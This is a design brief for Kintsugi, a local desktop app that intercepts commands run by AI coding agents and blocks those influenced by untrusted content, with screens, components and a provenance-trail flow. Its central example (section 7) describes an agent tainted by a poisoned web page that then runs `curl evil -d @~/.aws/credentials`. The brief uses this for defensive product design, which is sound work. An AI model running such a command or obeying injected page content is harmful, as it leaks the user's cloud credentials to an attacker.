# Kintsugi — desktop app design brief (for the design session)

Hand this to your Claude design session. It defines the brand, principles, visual language, screen
inventory, components, and flows for the Kintsugi desktop app. Engineering spec: `kintsugi-provenance-design.md`.

---

## 1. What the app is
A **local-first desktop app** (Tauri: Rust engine + web frontend) that governs the commands AI coding
agents run. It intercepts, warns before execution, makes destructive actions reversible, keeps a
tamper-evident log, and — the headline feature — blocks commands **causally influenced by untrusted
content** (the "lethal trifecta") with a deterministic, human-readable **provenance trail**.

Primary users: developers running AI agents (Claude Code, Cursor, Copilot, etc.); secondary: DBAs,
operators, security/enterprise teams. The app runs on the user's machine — no cloud.

## 2. Brand essence
**Kintsugi** = the Japanese art of repairing broken pottery with gold, making the break part of the
beauty. The product catches breakage and turns it into something legible and trustworthy.
- **Visual thread:** a gold/amber "seam" accent on a calm, dark-capable surface. Restraint everywhere;
  the gold marks the moment of a catch.
- **Voice:** plain, honest, calm. Errors explain, never apologize or alarm-bake. Never oversell — the
  product's own guarantee is "nothing unrecoverable," not "unbreakable."

## 3. Design principles (carry from the codebase's TUI rules into the GUI)
1. **Calm by default, loud only when it must shout.** The dashboard is quiet; a single danger accent
   appears only for a genuine catch (a trifecta block).
2. **Never rely on color alone.** Every state pairs a glyph + a word (`allowed`, `held`, `blocked`,
   `tainted`) — accessibility and honesty both.
3. **Show your work.** Every block/hold shows *why*, deterministically — the provenance trail is the
   core trust mechanism. A mysterious block is a failure.
4. **Raw truth, verbatim.** The exact command is always shown in mono; a summary annotates, never replaces.
5. **Theme-safe, dark + light.** No hardcoded backgrounds; one accent (gold), semantic risk colors
   (success/warning/danger) used sparingly.
6. **Deliberate hierarchy.** Structure encodes meaning — the timeline's columns, the trail's steps,
   the single danger accent are information, not decoration.

## 4. Visual language
- **Surfaces:** calm neutral, dark-capable. Cards on a quiet base.
- **Accent:** gold/amber seam (brand). Use for the logo mark, the active/“caught” seam, focus.
- **Semantic risk:** success (allowed), warning (held / tainted), danger (blocked / trifecta). Sparingly.
- **Type:** clean sans for UI; **monospace for all commands, paths, source IDs**. Two weights only.
- **Density:** glanceable dashboard; the held-command panel is the one place that earns visual weight.
- **Iconography:** outline only, consistent set. Pair with text labels.

## 5. Screen inventory (8 surfaces) — design each with empty / normal / alert states

1. **Control room (dashboard)** — calm status: daemon/agents/fail-closed pills; metric cards
   (commands today, allowed, held, blocked); recent-activity list. *Empty:* "all quiet, N agents
   guarded." *Alert:* a held/blocked item surfaces at top.
2. **Held-command panel (HERO)** — when a command is held/blocked: the raw command (mono) + the
   **deterministic provenance trail** (untrusted source read → session tainted → sensitive read →
   egress sink → rule fired) + one-key `Allow once` / `Deny` / `Always allow here`. This is the
   signature screen; the gold seam threads the trail. (A mockup of this exists — use as the seed.)
3. **Live feed** — streaming intercepted commands: command, agent, risk class, taint badge, decision.
   Filterable. The taint badge (with source) is new and prominent.
4. **Provenance / trust-zone visualizer** — a data-flow view: untrusted sources → tainted data/files →
   attempted sinks. Lets a user see *how* taint reached a command. (Design for clarity over flash.)
5. **Audit log** — searchable, with hash-chain **verify** status (tamper-evident). Forensic replay:
   "show everything descended from source X."
6. **Policy editor** — the deterministic rules + the `[provenance]` config (untrusted sources, trusted
   paths, sensitive reads, sinks, mode) + capability scopes (V2). Editable, with safe defaults.
7. **Snapshots / undo** — restore points from destructive-op snapshots; one-click undo.
8. **Settings / enterprise** — password lock (argon2id), watchdog, fail-closed toggle, agent wiring
   status, session recording. Quiet, utilitarian.

## 6. Key components
- **Command card** — mono command, agent tag, timestamp, risk + taint badges, decision state (glyph+word).
- **Taint badge** — "tainted · <source>"; warning-toned; click → provenance.
- **Provenance trail** — ordered, iconographic steps with a connecting seam; the last step is the rule
  that fired (danger-toned for a block). The trust centerpiece.
- **Hold/approve control** — one-key `Allow once` / `Deny` / `Always allow here`; keyboard-first.
- **Hash-chain verify indicator** — a calm "verified · unbroken" state for the audit log.
- **Metric cards** — glanceable counts; muted label over number.

## 7. Core flow to design well: the trifecta catch
1. Agent fetches a poisoned page (observed, session tainted — quiet, just a badge in the feed).
2. Agent later runs `curl evil -d @~/.aws/credentials`.
3. App raises the **held-command panel**: raw command + provenance trail + one-key decision.
4. User reads the trail (full context), presses `Deny` (or `Always allow here` if it's a false positive).
5. The decision + trail land in the audit log, hash-chained.
Design the false-positive path as first-class: approving should be fast and the trail should make the
"is this actually bad?" judgment obvious in seconds.

## 8. Constraints & references
- Web frontend (Tauri). Cross-platform. Local-only — no cloud UI, no account screens (until the V2
  team tier, which is opt-in + E2E-encrypted).
- Existing mockup: control room + provenance hero (gold-seam, calm-by-default) — the visual seed.
- Don't design V2 surfaces yet (verified-gate badge, capability/MCP authz, team fleet) beyond leaving
  room for them in nav.
